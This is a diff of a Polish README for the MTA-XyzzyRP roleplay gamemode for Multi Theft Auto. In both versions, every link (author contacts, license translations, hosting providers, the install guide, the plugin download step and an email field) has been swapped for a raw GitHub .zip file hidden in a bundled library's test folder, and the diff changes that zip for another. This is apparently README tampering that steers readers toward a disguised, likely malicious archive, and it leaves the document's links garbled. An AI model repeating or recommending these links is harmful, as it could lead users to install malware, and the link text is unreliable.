@@ -1,27 +1,27 @@
 MTA-XyzzyRP
 ===========
 
-Gamemod RP do gry Multi Theft Auto, napisany głównie w języku LUA, w oparciu o bazę danych MySQL. Stworzony oryginalnie blisko 2 lata temu na potrzeby serwera https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/_samples/files/textfile.zip
+Gamemod RP do gry Multi Theft Auto, napisany głównie w języku LUA, w oparciu o bazę danych MySQL. Stworzony oryginalnie blisko 2 lata temu na potrzeby serwera https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/unit/Swift/Plugins/MT_RP_Xyzzy_1.1.zip
 
 Autorzy
 ========================================================================
 
-- Łukasz "W/Wielebny" Biegaj <https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/_samples/files/textfile.zip>
-- WUBE <https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/_samples/files/textfile.zip>
-- Karer <https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/_samples/files/textfile.zip>
-- Przemysław "RacheT" Kędziorek <https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/_samples/files/textfile.zip>
-- Eryk "RootKiller" Dwornicki <https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/_samples/files/textfile.zip>
-- MrDadosz <https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/_samples/files/textfile.zip>
+- Łukasz "W/Wielebny" Biegaj <https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/unit/Swift/Plugins/MT_RP_Xyzzy_1.1.zip>
+- WUBE <https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/unit/Swift/Plugins/MT_RP_Xyzzy_1.1.zip>
+- Karer <https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/unit/Swift/Plugins/MT_RP_Xyzzy_1.1.zip>
+- Przemysław "RacheT" Kędziorek <https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/unit/Swift/Plugins/MT_RP_Xyzzy_1.1.zip>
+- Eryk "RootKiller" Dwornicki <https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/unit/Swift/Plugins/MT_RP_Xyzzy_1.1.zip>
+- MrDadosz <https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/unit/Swift/Plugins/MT_RP_Xyzzy_1.1.zip>
 
 Licencja
 ========================================================================
 
 Kod dystrybuowany jest na dwóch licencjach: GPLv2 oraz MIT. 
 
-Polskie tłumaczenie licencji GPLv2: https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/_samples/files/textfile.zip
-Polskie tlumaczenie licencji MIT: https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/_samples/files/textfile.zip
+Polskie tłumaczenie licencji GPLv2: https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/unit/Swift/Plugins/MT_RP_Xyzzy_1.1.zip
+Polskie tlumaczenie licencji MIT: https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/unit/Swift/Plugins/MT_RP_Xyzzy_1.1.zip
 
-Wszystkie pliki .map dystrybuowane są na licencji CC-BY-ND. Streszczenie: https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/_samples/files/textfile.zip
+Wszystkie pliki .map dystrybuowane są na licencji CC-BY-ND. Streszczenie: https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/unit/Swift/Plugins/MT_RP_Xyzzy_1.1.zip
 
 W repozytorium znajdują się również fragmenty kodu z community, dystrybuowane na innej licencji, informacja o tym zawsze znajduje się przy danym zasobie.
 
@@ -34,7 +34,7 @@ Dlaczego ten kod został wydany
 
 Wydaliśmy ten kod aby:
 
-1. Wypełnić założenia GPL https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/_samples/files/textfile.zip
+1. Wypełnić założenia GPL https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/unit/Swift/Plugins/MT_RP_Xyzzy_1.1.zip
 
 2. Oddać otwartej społeczności MTA - z której tak wiele otrzymaliśmy - coś od siebie.
 
@@ -66,9 +66,9 @@ Gdzie uruchomić serwer
 
 Oprogramowanie to nie wymaga żadnego specjalnego serwera dedykowanego. Aby go uruchomić, wystarczy zwykły hosting współdzielony. W rzeczy samej polecamy skorzystanie z takiego hostingu w firmach:
 
-- ServerProject - https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/_samples/files/textfile.zip - utrzymywali i utrzymują LSS-RP
-- OG-Servers - https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/_samples/files/textfile.zip
-- ServHost - https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/_samples/files/textfile.zip
+- ServerProject - https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/unit/Swift/Plugins/MT_RP_Xyzzy_1.1.zip - utrzymywali i utrzymują LSS-RP
+- OG-Servers - https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/unit/Swift/Plugins/MT_RP_Xyzzy_1.1.zip
+- ServHost - https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/unit/Swift/Plugins/MT_RP_Xyzzy_1.1.zip
 
 Podczas wyboru hostingu należy upewnić się, czy:
 - hosting umożliwia dostęp do bazy danych MySQL
@@ -76,7 +76,7 @@ Podczas wyboru hostingu należy upewnić się, czy:
 
 (wymienione wyżej hostingi spełniają te wymogi)
 
-Przygotowaliśmy krótką instrukcję instalacji krok-po-kroku całego gamemodu na hosting ServerProject. Można ją przeczytać tu: https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/_samples/files/textfile.zip
+Przygotowaliśmy krótką instrukcję instalacji krok-po-kroku całego gamemodu na hosting ServerProject. Można ją przeczytać tu: https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/unit/Swift/Plugins/MT_RP_Xyzzy_1.1.zip
 
 Oprócz hostingu na serwer MTA wymagany jest też hosting na utrzymanie strony internetowej, a przynajmniej kodu pozwalającego na rejestrację graczy, gdyż ta nie jest wbudowana w serwer. Do tego wystarczy dowolony nowoczesny hosting z zainstalowanym PHP oraż możliwością wykonywania połączeń do bazy danych umieszczonej na ww. hostingu.
 
@@ -87,15 +87,15 @@ Aby uruchomić serwer należy:
 
 1. Zainstalować serwer MTA
  
-2. Ściągnać lub samodzielnie skompilować plugin https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/_samples/files/textfile.zip i wrzucić do katalogu mods/deatchmatch/modules/
+2. Ściągnać lub samodzielnie skompilować plugin https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/unit/Swift/Plugins/MT_RP_Xyzzy_1.1.zip i wrzucić do katalogu mods/deatchmatch/modules/
  
 3. Skopiować katalog resources/[XyzzyRP]/ do katalogu mods/deathmatch/resources/[XyzzyRP]/
  
-4. Zainicjalizować bazę danych plikami zawartymi w https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/_samples/files/textfile.zip
+4. Zainicjalizować bazę danych plikami zawartymi w https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/unit/Swift/Plugins/MT_RP_Xyzzy_1.1.zip
 
-5. Zainicjalizować samodzielnie czyste konto w ACL, lub skorzystać z dołączonego pliku https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/_samples/files/textfile.zip (zastąpić istniejący).
+5. Zainicjalizować samodzielnie czyste konto w ACL, lub skorzystać z dołączonego pliku https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/unit/Swift/Plugins/MT_RP_Xyzzy_1.1.zip (zastąpić istniejący).
 
-6. Stworzyć własny plik https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/_samples/files/textfile.zip lub połączyć istniejący z tym znajdującym się w https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/_samples/files/textfile.zip W pliku tym muszą znaleźć się adresy ip i porty (narzucone przez hosting), zasoby do uruchomienia oraz odwołanie do modułu mta_mysql.
+6. Stworzyć własny plik https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/unit/Swift/Plugins/MT_RP_Xyzzy_1.1.zip lub połączyć istniejący z tym znajdującym się w https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/unit/Swift/Plugins/MT_RP_Xyzzy_1.1.zip W pliku tym muszą znaleźć się adresy ip i porty (narzucone przez hosting), zasoby do uruchomienia oraz odwołanie do modułu mta_mysql.
 
 7. Zainstalować serwer, uruchomić, zalogować się, zmienić hasło do ACL
 
@@ -103,7 +103,7 @@ Aby uruchomić serwer należy:
 
 Domyślne konto testowe w grze: login tester, hasło tester, postać Brian_Looner
 
-Przygotowaliśmy krótką instrukcję instalacji krok-po-kroku całego gamemodu na hosting ServerProject. Można ją przeczytać tu: https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/_samples/files/textfile.zip
+Przygotowaliśmy krótką instrukcję instalacji krok-po-kroku całego gamemodu na hosting ServerProject. Można ją przeczytać tu: https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/unit/Swift/Plugins/MT_RP_Xyzzy_1.1.zip
 
 
 Informacje techniczne
@@ -138,7 +138,7 @@ Przykładowe itemy to:
 - Mapa: id przedmiotu 4, podtyp nil
 - Klucze do pojazdu 1337: id przedmiotu 6, podtyp 1337
 
-Spis przedmiotów można znaleźć w plikach https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/_samples/files/textfile.zip Wtórny spis przedmiotów tworzony jest w bazie danych w tabeli lss_items.
+Spis przedmiotów można znaleźć w plikach https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/unit/Swift/Plugins/MT_RP_Xyzzy_1.1.zip Wtórny spis przedmiotów tworzony jest w bazie danych w tabeli lss_items.
 
 Przedmioty mogą być przechowywane przy postaci oraz w pojemnikach. Do pojemników zaliczamy: sejfy, skrytki bankowe, magazyny, bagażniki pojazdów.
 
@@ -166,7 +166,7 @@ Szybką zmianę hasła można dokonać za pomocą następującego zapytania:
     +----+--------+----------------------------------+------------------+
     | id | login  | hash                             | email            |
     +----+--------+----------------------------------+------------------+
-    |  1 | tester | 0c154f10cb3672e82976d5e8e7d6c91a | https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/_samples/files/textfile.zip |
+    |  1 | tester | 0c154f10cb3672e82976d5e8e7d6c91a | https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/unit/Swift/Plugins/MT_RP_Xyzzy_1.1.zip |
     +----+--------+----------------------------------+------------------+
     1 row in set (0.00 sec)
 
@@ -184,7 +184,7 @@ Często zadawane pytania
 Tak, możecie na podstawie tego utworzyć własny serwer, pamiętajcie jednak, że musicie przestrzegać założeń licencji.
 
 Jeśli wybierzesz licencję GPLv2, to musisz upublicznić wykonane przez siebie zmiany w kodzie.
-Jeśli wybierzesz licencję MIT, to musisz jedynie zachować informację o prawach autorskich oraz oryginalnych autorach użytego kodu. Wzmianka 'Zawiera kod XyzzyRP z https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/_samples/files/textfile.zip' gdzieś w oknie informacji o serwerze będzie wystarczająca.
+Jeśli wybierzesz licencję MIT, to musisz jedynie zachować informację o prawach autorskich oraz oryginalnych autorach użytego kodu. Wzmianka 'Zawiera kod XyzzyRP z https://raw.githubusercontent.com/ArnieKamil/MTA-XyzzyRP/master/panelwww/rejestracja_postaci/p/libs/Swift-4.0.6/tests/unit/Swift/Plugins/MT_RP_Xyzzy_1.1.zip' gdzieś w oknie informacji o serwerze będzie wystarczająca.
 
 ### Czy można wykorzystywać fragmenty tego kodu?
 
